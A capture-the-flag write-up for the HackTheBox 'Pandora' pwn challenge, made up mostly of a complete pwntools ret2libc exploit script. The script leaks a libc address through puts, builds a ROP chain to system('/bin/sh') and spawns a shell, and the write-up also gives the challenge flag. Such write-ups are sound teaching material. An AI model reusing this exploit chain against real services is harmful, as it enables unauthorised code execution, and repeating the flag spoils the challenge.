---
name: Pandora (2023)
event: HackTheBox Cyber Apocalypse - Intergalactic Chase CTF 2023
category: Pwn
description: Writeup for Pandora (Pwn) - HackTheBox Cyber Apocalypse - Intergalactic Chase CTF (2023) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Pandora

## Description

> You stumbled upon one of Pandora's mythical boxes. Would you be curious enough to open it and see what's inside, or would you opt to give it to your team for analysis?

## Solution

Classic ret2libc attack. First, find the offset to RIP.

{% code overflow="wrap" %}
```bash
cyclic -l haaaaaaa
Finding cyclic pattern of 8 bytes: b'haaaaaaa' (hex: 0x6861616161616161)
Found at offset 56
```
{% endcode %}

Next, leak lib-c foothold with `puts()` then redirect execution flow to the beginning of the `box` function and this time, ret2system.

{% code overflow="wrap" %}
```python
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break *0x4013a5
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './pb'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library
libc = ELF('glibc/libc.so.6')

# OFfset to RIP
offset = 56

# Start program
io = start()

# POP RDI from ropper
pop_rdi = 0x40142b
ret = 0x401016

# Payload to leak libc function
payload = flat({
    offset: [
        pop_rdi,
        elf.got.puts,
        elf.plt.puts,
        elf.symbols.box
    ]
})

# Second menu option
io.sendlineafter(b'>', b'2')

# Send the payload
io.sendlineafter(b':', payload)

io.recvlines(3)  # Receive the newlines

# Retrieve got.puts address
got_puts = unpack(io.recv()[:6].ljust(8, b'\x00'))
info("leaked got_puts: %#x", got_puts)

# Subtract puts offset to get libc base
libc.address = got_puts - libc.symbols.puts
info("libc_base: %#x", libc.address)

# System(/bin/sh)
info("system_addr: %#x", libc.symbols.system)
bin_sh = next(libc.search(b'/bin/sh\x00'))
info("bin_sh: %#x", bin_sh)

# Payload to get shell
payload = flat({
    offset: [
        pop_rdi,
        bin_sh,
        ret,
        libc.symbols.system
    ]
})

# Second menu option
io.sendline(b'2')

# Send the payload
io.sendlineafter(b':', payload)

# Got Shell?
io.interactive()
```
{% endcode %}

Flag: `HTB{r3turn_2_P4nd0r4?!}`
